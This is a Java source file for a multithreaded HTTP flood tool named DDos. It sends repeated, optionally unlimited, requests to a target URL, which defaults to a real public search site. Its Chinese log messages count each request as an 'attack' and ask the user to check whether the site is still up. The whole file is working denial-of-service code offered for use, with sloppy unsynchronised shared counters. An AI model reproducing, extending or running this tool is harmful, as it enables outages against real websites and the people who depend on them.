package net.itanken.ddos;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.ExecutorService;
//import java.util.concurrent.Executors;
//import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

import net.itanken.ddos.utils.StrUtils;

public class DDos {

	public static int count = 0; // 总次数
	public static int succeCount = 0; // 成功次数
	public static int filedCount = 0; // 失败次数
	public static int threadCount = 0;
	public static int requestCount = 0;
	
	private ExecutorService es = null;
	private ThreadPoolExecutor threadPool = null;
	/**
	 * @param tCount 线程数
	 * @param sCount 单线程请求数
	 * @throws InterruptedException
	 */
	public void doDDos(int tCount, int sCount) throws InterruptedException {
		count = 0;
		succeCount = 0;
		filedCount = 0;
		threadCount = tCount;
		requestCount = sCount;
/*		es = Executors.newFixedThreadPool(tCount);
		for (int i = 0; i < tCount; i++) {
			Dthread dThread = new Dthread("线程 " + i, "", sCount);
			Thread thread = new Thread(dThread);
			es.execute(thread);
		}
		es.shutdown();
*/
        BlockingQueue<Runnable> queue = new ArrayBlockingQueue<Runnable>(tCount);
        threadPool = new ThreadPoolExecutor(8, 20, 5, TimeUnit.SECONDS,
                queue, new ThreadPoolExecutor.AbortPolicy());
		for (int i = 0; i < tCount; i++) {
            // System.out.println("当前线程池大小[" + threadPool.getPoolSize() + "],当前队列大小[" + queue.size() + "]");
            threadPool.execute(new Dthread("线程 " + (i + 1), "", sCount));
        }
        threadPool.shutdown(); // 关闭线程池
	}
	
	public boolean stopDDos() {
		if(es != null) {
			es.shutdownNow();
			return true;
		}
		if(threadPool != null) {
			threadPool.shutdownNow();
			return true;
		}
		return false;
	}
	
	/**
	 * Test Method
	 */
	public static void main(String[] args) throws InterruptedException {
		//new DDos().doDDos(5, 2);
	}
}

class Dthread implements Runnable {
	private static String urlStr = "https://www.baidu.com/";
	private static int count = 1000;
	private String name = "线程 -1 ";

	/**
	 * @param url 请求地址
	 * @param sCount 单线程请求数
	 */
	public Dthread(String name, String url, int sCount) {
		this.name = name;
		if (!StrUtils.isEmpty(url)) {
			urlStr = url;
		}
		count = sCount;
	}

	public void run() {
		int i = 0;
		while (count == 0 || i < count) {
			try {
				DDos.count++;
				int curCount = ++i;
				URL url = new URL(urlStr);
				URLConnection conn = url.openConnection();

				if(conn.getContentLength() > -1) {
					DDosFrame.appendInfo(name + " 第 " + curCount + " 次发包成功！" + StrUtils.LINE_SEPAR);
					
					BufferedInputStream bis = new BufferedInputStream(conn.getInputStream());
					byte[] bytes = new byte[1024];
					int len = -1;
					StringBuffer sb = new StringBuffer();
					if (bis != null && (len = bis.read()) != -1) {
						DDosFrame.appendInfo(name + " 第 " + curCount + " 次攻击成功！" + StrUtils.LINE_SEPAR);
						sb.append(new String(bytes, 0, len));
						bis.close();
						DDos.succeCount++;
					} else {
						DDosFrame.appendInfo(name + " 第 " + curCount + " 次攻击失败..." + StrUtils.LINE_SEPAR);
					}
				} else {
					DDosFrame.appendInfo(name + " 第 " + curCount + " 次发包失败..." + StrUtils.LINE_SEPAR);
					DDos.filedCount++;
				}
				int count = DDos.threadCount * DDos.requestCount;
				if(DDos.count >= count && DDos.requestCount != 0) {
					DDosFrame.appendInfo(StrUtils.LINE_SEPAR + "执行完毕！共执行 " + count + " 次攻击" + StrUtils.LINE_SEPAR
							+ "其中成功 " + DDos.succeCount + " 次，失败 " + DDos.filedCount + " 次。" + StrUtils.LINE_SEPAR);
				}
			} catch (MalformedURLException e) {
				DDosFrame.console.showError(e);
			} catch (IOException e) {
				DDosFrame.console.showError(e);
				if (e.getMessage().contains("Server returned HTTP response code")) { // 攻击成功
					DDosFrame.appendInfo("请检查网站状态！");
				}
			}
		}
	}
}